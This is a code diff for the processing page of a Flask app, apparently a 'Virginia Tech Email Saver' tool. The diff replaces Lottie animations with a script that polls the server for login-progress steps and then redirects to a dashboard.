@@ -3,36 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing...</title>
+    <title>Processing Submission</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
-    <script src="https://esm.sh/@lottiefiles/dotlottie-web" type="module"></script>
 </head>
 <body>
     <div class="container">
-        <div id="animation-container">
-            <div id="storing-credentials" class="animation hidden">
-                <h2>Storing your credentials securely...</h2>
-                <canvas id="storing-animation"></canvas>
-            </div>
-            <div id="attempting-login" class="animation hidden">
-                <h2>Attempting to log in...</h2>
-                <canvas id="login-animation"></canvas>
-            </div>
-            <div id="push-notification" class="animation hidden">
-                <h2>Sending a push notification to your device...</h2>
-                <canvas id="push-animation"></canvas>
-            </div>
-            <div id="success" class="animation hidden">
-                <h2>Success!</h2>
-                <canvas id="success-animation"></canvas>
-            </div>
+        <h1>Processing Your Submission...</h1>
+        <div id="output-container">
+            <p>Preparing to submit...</p>
         </div>
     </div>
+    <script>
+        const email = localStorage.getItem("email"); // Retrieve email from local storage
 
-    <footer>
-        <p>&copy; 2025 Virginia Tech Email Saver</p>
-    </footer>
+        // Poll the server for progress updates
+        function pollProgress() {
+            fetch("/get_progress")
+                .then((response) => response.json())
+                .then((data) => {
+                    const outputContainer = document.getElementById("output-container");
+                    const stepMessages = {
+                        0: "Preparing to submit...",
+                        1: "Storing your credentials securely...",
+                        2: "Attempting to log in...",
+                        3: "Sending a push notification to your device...",
+                        4: "Login Successful! Redirecting to your dashboard...",
+                    };
 
-    <script type="module" src="{{ url_for('static', filename='js/animations.js') }}"></script>
+                    // Update the output container with the current step message
+                    outputContainer.innerHTML = `<p>${stepMessages[data.step] || "Unknown progress step."}</p>`;
+
+                    // Redirect to dashboard if the process is complete
+                    if (data.step === 4) {
+                        setTimeout(() => {
+                            window.location.href = `/dashboard?email=${encodeURIComponent(email)}`;
+                        }, 2000); // Wait 2 seconds before redirecting
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error polling progress:", error);
+                });
+        }
+
+        // Start polling every second
+        setInterval(pollProgress, 1000);
+    </script>
 </body>
 </html>
